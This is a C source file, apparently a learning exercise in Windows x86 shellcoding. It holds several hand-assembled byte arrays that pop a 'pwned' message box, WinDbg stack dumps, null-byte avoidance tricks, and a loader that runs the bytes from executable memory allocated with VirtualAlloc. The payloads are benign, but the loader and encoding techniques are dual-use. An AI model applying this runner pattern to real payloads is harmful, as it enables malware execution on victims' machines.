#include <stdio.h>
#include <windows.h>

// https://blackcloud.me/Win32-shellcode-2/
// https://packetstormsecurity.com/files/156478/Windows-x86-Null-Free-WinExec-Calc.exe-Shellcode.html
// http://www.integra4notes.com/Web/Integra/IntegraLibDoc.nsf/e0315c6c01309a87c1256f0b002c29fc/53f135198891b62cc12573690032b5a5?OpenDocument

/*
PS C:\Users\Sales2\Desktop\Shellcoding> .\arwin.exe User32.dll MessageBoxA
arwin - win32 address resolution program - by steve hanna - v.01
MessageBoxA is located at 0x75100660 in User32.dll

0:000> uf USER32!MessageBoxA
USER32!MessageBoxA:
75100660 8bff            mov     edi,edi
75100662 55              push    ebp
75100663 8bec            mov     ebp,esp
75100665 833d944c127500  cmp     dword ptr [USER32!gfEMIEnable (75124c94)],0
7510066c 7422            je      USER32!MessageBoxA+0x30 (75100690)  Branch

751006a0 e83b020000      call    USER32!MessageBoxTimeoutA (751008e0)
0:000>
ModLoad: 5f4c0000 5f554000   C:\WINDOWS\SysWOW64\TextShaping.dll
ModLoad: 76db0000 76e6f000   C:\WINDOWS\SysWOW64\msvcrt.dll
ModLoad: 6f8c0000 6f934000   C:\WINDOWS\SysWOW64\uxtheme.dll
ModLoad: 75920000 75ba0000   C:\WINDOWS\SysWOW64\combase.dll
ModLoad: 75c80000 75d3e000   C:\WINDOWS\SysWOW64\RPCRT4.dll
ModLoad: 75400000 754d4000   C:\WINDOWS\SysWOW64\MSCTF.dll
ModLoad: 765c0000 76656000   C:\WINDOWS\SysWOW64\OLEAUT32.dll
ModLoad: 762f0000 76366000   C:\WINDOWS\SysWOW64\sechost.dll
ModLoad: 74900000 7490f000   C:\WINDOWS\SysWOW64\kernel.appcore.dll
ModLoad: 75fa0000 75fff000   C:\WINDOWS\SysWOW64\bcryptPrimitives.dll
ModLoad: 6d0e0000 6d199000   C:\WINDOWS\SysWOW64\textinputframework.dll
ModLoad: 6ce60000 6d0de000   C:\WINDOWS\SysWOW64\CoreUIComponents.dll
ModLoad: 6cdc0000 6ce5b000   C:\WINDOWS\SysWOW64\CoreMessaging.dll
ModLoad: 76660000 766e7000   C:\WINDOWS\SysWOW64\SHCORE.dll
ModLoad: 76ed0000 76f33000   C:\WINDOWS\SysWOW64\WS2_32.dll
ModLoad: 76440000 764bb000   C:\WINDOWS\SysWOW64\advapi32.dll
ModLoad: 74910000 74939000   C:\WINDOWS\SysWOW64\ntmarta.dll
ModLoad: 051b0000 0528b000   C:\WINDOWS\SysWOW64\wintypes.dll
ModLoad: 06630000 0670b000   C:\WINDOWS\SysWOW64\wintypes.dll
ModLoad: 6cce0000 6cdbb000   C:\WINDOWS\SysWOW64\wintypes.dll

75100989 e832000000      call    USER32!MessageBoxTimeoutW (751009c0)
0:000>
ModLoad: 5f4c0000 5f554000   C:\WINDOWS\SysWOW64\TextShaping.dll
ModLoad: 76db0000 76e6f000   C:\WINDOWS\SysWOW64\msvcrt.dll
ModLoad: 6f8c0000 6f934000   C:\WINDOWS\SysWOW64\uxtheme.dll
ModLoad: 75920000 75ba0000   C:\WINDOWS\SysWOW64\combase.dll
ModLoad: 75c80000 75d3e000   C:\WINDOWS\SysWOW64\RPCRT4.dll
ModLoad: 75400000 754d4000   C:\WINDOWS\SysWOW64\MSCTF.dll
ModLoad: 765c0000 76656000   C:\WINDOWS\SysWOW64\OLEAUT32.dll
ModLoad: 762f0000 76366000   C:\WINDOWS\SysWOW64\sechost.dll
ModLoad: 74900000 7490f000   C:\WINDOWS\SysWOW64\kernel.appcore.dll
ModLoad: 75fa0000 75fff000   C:\WINDOWS\SysWOW64\bcryptPrimitives.dll
ModLoad: 6d0e0000 6d199000   C:\WINDOWS\SysWOW64\textinputframework.dll
ModLoad: 6cdc0000 6ce5b000   C:\WINDOWS\SysWOW64\CoreMessaging.dll
ModLoad: 6ce60000 6d0de000   C:\WINDOWS\SysWOW64\CoreUIComponents.dll
ModLoad: 76ed0000 76f33000   C:\WINDOWS\SysWOW64\WS2_32.dll
ModLoad: 76660000 766e7000   C:\WINDOWS\SysWOW64\SHCORE.dll
ModLoad: 74910000 74939000   C:\WINDOWS\SysWOW64\ntmarta.dll
ModLoad: 6cce0000 6cdbb000   C:\WINDOWS\SysWOW64\wintypes.dll
ModLoad: 76440000 764bb000   C:\WINDOWS\SysWOW64\advapi32.dll
*/
int main()
{

    char corelan_message_box_shellcode_edited_a_little_bit[] = \
        "\x33\xc0"
        "\x50"
        "\x68\x6c\x61\x6e\x20"   // Push "Corelan"
        "\x68\x43\x6f\x72\x65"   // 
        "\x8b\xdc"               // mov ebx,esp, ebx is now pointing to "Corelan"
        "\x50"                   // PUSH EAX = > padding for lpCaption (because we need a nullbyte to terminate string)
        "\x68\x61\x6e\x20\x20"   // Push "You have been pwned by Corelan"
        "\x68\x6f\x72\x65\x6c"   // 
        "\x68\x62\x79\x20\x43"   // 
        "\x68\x6e\x65\x64\x20"   //
        "\x68\x6e\x20\x70\x77"   //
        "\x68\x20\x62\x65\x65"   //
        "\x68\x68\x61\x76\x65"   //
        "\x68\x59\x6f\x75\x20"   //
        "\x8b\xcc"               // mov ecx,esp, ecx is now pointing to "You have been pwned by Corelan"
        "\x33\xc0"               // PUSH EAX = > padding for lpCaption (because we need a nullbyte to terminate string)
        "\x50"                   // push eax, arg 1
        "\x53"                   // push ebx, arg 2 
        "\x51"                   // push ecx, arg 3
        "\x50"                   // push eax, arg 4
        /*
        If no additional value, then stack not aligned, stacked not aligned in this context means no return address. Top of the stack is the return address. Remember ret2libc attack on 32 bit.
        Breakpoint 0 hit
        eax=00000000 ebx=0073f72c ecx=0073f708 edx=ff751006 esi=75100660 edi=0073f814
        eip=75100660 esp=0073f6f4 ebp=0073f814 iopl=0         nv up ei pl zr na pe nc
        cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
        USER32!MessageBoxA:
        75100660 8bff            mov     edi,edi
        0:000> dd esp
        00effbb8  00000000 00effbc8 00effbec 00000000
        00effbc8  20756f59 65766168 65656220 7770206e
        00effbd8  2064656e 43207962 6c65726f 6e206e61
        00effbe8  00000000 65726f43 6e6e616c 00000000
        00effbf8  00891923 00effdd8 00897bb0 00d66000
        00effc08  cccccccc cccccccc cccccccc cccccccc
        00effc18  cccccccc cccccccc cccccccc cccccccc
        00effc28  cccccccc cccccccc cccccccc cccccccc
        */
        "\x68"                   //Need to set return address (see fuzzy security windbg logs). For now we just set it an invalid address 0x41414141
        "AAAA"
        /*
        Breakpoint 0 hit
        eax=00000000 ebx=0073f72c ecx=0073f708 edx=ff751006 esi=75100660 edi=0073f814
        eip=75100660 esp=0073f6f4 ebp=0073f814 iopl=0         nv up ei pl zr na pe nc
        cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
        USER32!MessageBoxA:
        75100660 8bff            mov     edi,edi
        0:000> dd esp
        00b3f4fc  41414141 00000000 00b3f510 00b3f534
        00b3f50c  00000000 20756f59 65766168 65656220
        00b3f51c  7770206e 2064656e 43207962 6c65726f
        00b3f52c  20206e61 00000000 65726f43 206e616c
        00b3f53c  00000000 00611923 00b3f720 00617bb8
        00b3f54c  00916000 cccccccc cccccccc cccccccc
        00b3f55c  cccccccc cccccccc cccccccc cccccccc
        00b3f56c  cccccccc cccccccc cccccccc cccccccc
        0:000> g
        ModLoad: 5f4c0000 5f554000   C:\WINDOWS\SysWOW64\TextShaping.dll
        ModLoad: 76db0000 76e6f000   C:\WINDOWS\SysWOW64\msvcrt.dll
        ModLoad: 6f8c0000 6f934000   C:\WINDOWS\SysWOW64\uxtheme.dll
        ModLoad: 75920000 75ba0000   C:\WINDOWS\SysWOW64\combase.dll
        ModLoad: 75c80000 75d3e000   C:\WINDOWS\SysWOW64\RPCRT4.dll
        ModLoad: 75400000 754d4000   C:\WINDOWS\SysWOW64\MSCTF.dll
        ModLoad: 765c0000 76656000   C:\WINDOWS\SysWOW64\OLEAUT32.dll
        ModLoad: 762f0000 76366000   C:\WINDOWS\SysWOW64\sechost.dll
        ModLoad: 74900000 7490f000   C:\WINDOWS\SysWOW64\kernel.appcore.dll
        ModLoad: 75fa0000 75fff000   C:\WINDOWS\SysWOW64\bcryptPrimitives.dll
        ModLoad: 6d0e0000 6d199000   C:\WINDOWS\SysWOW64\textinputframework.dll
        ModLoad: 6cdc0000 6ce5b000   C:\WINDOWS\SysWOW64\CoreMessaging.dll
        ModLoad: 6ce60000 6d0de000   C:\WINDOWS\SysWOW64\CoreUIComponents.dll
        ModLoad: 76ed0000 76f33000   C:\WINDOWS\SysWOW64\WS2_32.dll
        ModLoad: 76660000 766e7000   C:\WINDOWS\SysWOW64\SHCORE.dll
        ModLoad: 74910000 74939000   C:\WINDOWS\SysWOW64\ntmarta.dll
        ModLoad: 76440000 764bb000   C:\WINDOWS\SysWOW64\advapi32.dll
        ModLoad: 6cce0000 6cdbb000   C:\WINDOWS\SysWOW64\wintypes.dll
        ModLoad: 06040000 0611b000   C:\WINDOWS\SysWOW64\wintypes.dll
        ModLoad: 06120000 061fb000   C:\WINDOWS\SysWOW64\wintypes.dll
        ModLoad: 75da0000 75e83000   C:\WINDOWS\SysWOW64\ole32.dll
        (3670.1928): Access violation - code c0000005 (first chance) <- after pressing ok
        First chance exceptions are reported before any exception handling.
        This exception may be expected and handled.
        eax=00000001 ebx=00b3f534 ecx=00d40000 edx=00d40000 esi=75100660 edi=00b3f61c
        eip=41414141 esp=00b3f510 ebp=00b3f61c iopl=0         nv up ei pl zr na pe nc
        cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
        41414141 ??              ???
        */
        "\xc7\xc6\x60\x06\x10\x75"   //MOV ESI, USER32.MessageBoxA
        "\xff\xe6";              //JMP ESI

    /*
    The reason why you don't need to push a return address is because you are running call instead of jmp. Call pushes the
    next address to execute to the top of the stack which is the return address when the function completes and returns
    */
    char fuzzy_security_message_box_shellcode[] = \
        "\x33\xc0"                          //# XOR EAX, EAX
        "\x50"                              //# PUSH EAX = > padding for lpCaption (because we need a nullbyte to terminate string)
        "\x68\x62\x33\x33\x66"              //# PUSH "b33f"
        "\x8B\xCC"                          //# MOV ECX, ESP = > PTR to lpCaption
        "\x50"                              //# PUSH EAX = > padding for lpText
        "\x68\x62\x6F\x78\x21"              //# PUSH "box!"
        "\x68\x74\x68\x65\x20"              //# PUSH "the "
        "\x68\x50\x6F\x70\x20"              //# PUSH "Pop "
        "\x8B\xD4"                          //# MOV EDX, ESP = > PTR to lpText
        "\x50"                              //# PUSH EAX - uType = 0x0
        "\x51"                              //# PUSH ECX - lpCaption
        "\x52"                              //# PUSH EDX - lpText
        "\x50"                              //# PUSH EAX - hWnd = 0x0
        /*
        Breakpoint 0 hit
        eax=00000000 ebx=00bfb000 ecx=007df90c edx=007df8fc esi=75100660 edi=007df9f0
        eip=75100660 esp=007df8e8 ebp=007df9f0 iopl=0         nv up ei pl zr na pe nc
        cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
        USER32!MessageBoxA:
        75100660 8bff            mov     edi,edi
        0:000> dd esp
        007df8e8  00970027 00000000 007df8fc 007df90c
        007df8f8  00000000 20706f50 20656874 21786f62
        007df908  00000000 66333362 00000000 009c1923
        007df918  007dfaf4 009c7bb0 00bfb000 cccccccc
        007df928  cccccccc cccccccc cccccccc cccccccc
        007df938  cccccccc cccccccc cccccccc cccccccc
        007df948  cccccccc cccccccc cccccccc cccccccc
        007df958  cccccccc cccccccc cccccccc cccccccc
        */
        "\xBE\x60\x06\x10\x75"              //# MOV ESI, USER32.MessageBoxA
        "\xFF\xD6";                         //# CALL ESI

    /*
    PS C:\Users\Sales2\Desktop\Shellcoding> .\arwin.exe kernel32.dll ExitThread
    arwin - win32 address resolution program - by steve hanna - v.01
    ExitThread is located at 0x7721b570 in kernel32.dll
    PS C:\Users\Sales2\Desktop\Shellcoding> .\arwin.exe kernel32.dll ExitProcess
    arwin - win32 address resolution program - by steve hanna - v.01
    ExitProcess is located at 0x76024100 in kernel32.dll
    */

    char exitThread[] = "\x70\xb5\x21\x77";
    char exitProcess[] = "\x00\x41\x02\x76"; // have nullbyte so cannot use
    /*
    mov edx, 0x87135211;
    sub edx, 0x11111111;
    push edx;
    0:  ba 11 52 13 87          mov    edx,0x87135211
    5:  81 ea 11 11 11 11       sub    edx,0x11111111
    b:  52                      push   edx

    XOR EAX,EAX;
    MOV EBP,ESP;
    PUSH 0x760241FF;
    MOV [EBP-4],AL
    0:  31 c0                   xor    eax,eax
    2:  89 e5                   mov    ebp,esp
    4:  68 ff 41 02 76          push   0x760241ff
    9:  88 45 fc                mov    BYTE PTR [ebp-0x4],al
    */
    char gadget[] = "\x2e\x1d\x41\x00"; // have nullbyte so cannot use
    /*
    uf ShellcodeMessageBox_exe!triggerSEH 
    297 00411d2e 33c0            xor     eax,eax
    298 00411d30 ffd0            call    eax

    https://www.calculator.net/hex-calculator.html?number1=00411cbe&c2op=%2B&number2=11111111&calctype=op&x=69&y=14
    mov edx, 0x11522E3F;
    sub edx, 0x11111111;
    push edx;

    https://defuse.ca/online-x86-assembler.htm#disassembly
    0:  ba 3f 2e 52 11          mov    edx,0x11522e3f
    5:  81 ea 11 11 11 11       sub    edx,0x11111111
    b:  52                      push   edx                 
    */

    char corelan_message_box_shellcode_edited_a_little_bit_exit_properly[] = \
        "\x33\xc0"
        "\x50"
        "\x68\x6c\x61\x6e\x20"   // Push "Corelan"
        "\x68\x43\x6f\x72\x65"   // 
        "\x8b\xdc"               // mov ebx,esp, ebx is now pointing to "Corelan"
        "\x50"                   // PUSH EAX = > padding for lpCaption (because we need a nullbyte to terminate string)
        "\x68\x61\x6e\x20\x20"   // Push "You have been pwned by Corelan"
        "\x68\x6f\x72\x65\x6c"   // 
        "\x68\x62\x79\x20\x43"   // 
        "\x68\x6e\x65\x64\x20"   //
        "\x68\x6e\x20\x70\x77"   //
        "\x68\x20\x62\x65\x65"   //
        "\x68\x68\x61\x76\x65"   //
        "\x68\x59\x6f\x75\x20"   //
        "\x8b\xcc"               // mov ecx,esp, ecx is now pointing to "You have been pwned by Corelan"
        "\x33\xc0"               // PUSH EAX = > padding for lpCaption (because we need a nullbyte to terminate string)
        "\x50"                   // push eax, arg 1
        "\x53"                   // push ebx, arg 2 
        "\x51"                   // push ecx, arg 3
        "\x50"                   // push eax, arg 4
        "\x68"                   //Need to set return address (see fuzzy security windbg logs).
        "\x70\xb5\x21\x77"
        "\xc7\xc6\x60\x06\x10\x75"   //MOV ESI, USER32.MessageBoxA
        "\xff\xe6";              //JMP ESI

    char corelan_message_box_shellcode_edited_deal_with_null_byte_add_sub_trigger_seh[] = \
        "\x33\xc0"
        "\x50"
        "\x68\x6c\x61\x6e\x20"   // Push "Corelan"
        "\x68\x43\x6f\x72\x65"   // 
        "\x8b\xdc"               // mov ebx,esp, ebx is now pointing to "Corelan"
        "\x50"                   // PUSH EAX = > padding for lpCaption (because we need a nullbyte to terminate string)
        "\x68\x61\x6e\x20\x20"   // Push "You have been pwned by Corelan"
        "\x68\x6f\x72\x65\x6c"   // 
        "\x68\x62\x79\x20\x43"   // 
        "\x68\x6e\x65\x64\x20"   //
        "\x68\x6e\x20\x70\x77"   //
        "\x68\x20\x62\x65\x65"   //
        "\x68\x68\x61\x76\x65"   //
        "\x68\x59\x6f\x75\x20"   //
        "\x8b\xcc"               // mov ecx,esp, ecx is now pointing to "You have been pwned by Corelan"
        "\x33\xc0"               // PUSH EAX = > padding for lpCaption (because we need a nullbyte to terminate string)
        "\x50"                   // push eax, arg 1
        "\x53"                   // push ebx, arg 2 
        "\x51"                   // push ecx, arg 3
        "\x50"                   // push eax, arg 4
        "\xba\x3f\x2e\x52\x11"
        "\x81\xea\x11\x11\x11\x11"
        "\x52"
        "\xc7\xc6\x60\x06\x10\x75"   //MOV ESI, USER32.MessageBoxA
        "\xff\xe6";              //JMP ESI

    char corelan_message_box_shellcode_edited_deal_with_null_byte_precision_exit_process[] = \
        "\x33\xc0"
        "\x50"
        "\x68\x6c\x61\x6e\x20"   // Push "Corelan"
        "\x68\x43\x6f\x72\x65"   // 
        "\x8b\xdc"               // mov ebx,esp, ebx is now pointing to "Corelan"
        "\x50"                   // PUSH EAX = > padding for lpCaption (because we need a nullbyte to terminate string)
        "\x68\x61\x6e\x20\x20"   // Push "You have been pwned by Corelan"
        "\x68\x6f\x72\x65\x6c"   // 
        "\x68\x62\x79\x20\x43"   // 
        "\x68\x6e\x65\x64\x20"   //
        "\x68\x6e\x20\x70\x77"   //
        "\x68\x20\x62\x65\x65"   //
        "\x68\x68\x61\x76\x65"   //
        "\x68\x59\x6f\x75\x20"   //
        "\x8b\xcc"               // mov ecx,esp, ecx is now pointing to "You have been pwned by Corelan"
        "\x33\xc0"               // PUSH EAX = > padding for lpCaption (because we need a nullbyte to terminate string)
        "\x50"                   // push eax, arg 1
        "\x53"                   // push ebx, arg 2 
        "\x51"                   // push ecx, arg 3
        "\x50"                   // push eax, arg 4
        "\x31\xc0"   
        "\x89\xe5"
        "\x68\xff\x41\x02\x76"
        "\x88\x45\xfc"
        "\xc7\xc6\x60\x06\x10\x75"   //MOV ESI, USER32.MessageBoxA
        "\xff\xe6";              //JMP ESI

    execute(corelan_message_box_shellcode_edited_deal_with_null_byte_precision_exit_process);
    return 0;
}

int execute(char shellcode[]) {

    // When executing shellcode this way, your shellcode also cannot have nullbytes

    GetActiveWindow(); // force executable to use user32.dll

    printf("shellcode length: %i", strlen(shellcode));

    LPVOID lpAlloc = VirtualAlloc(0, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(lpAlloc, shellcode, strlen(shellcode));

    ((void(*)())lpAlloc)();
}

void triggerSEH() {
    __asm {
        xor eax, eax
        call eax
    }
}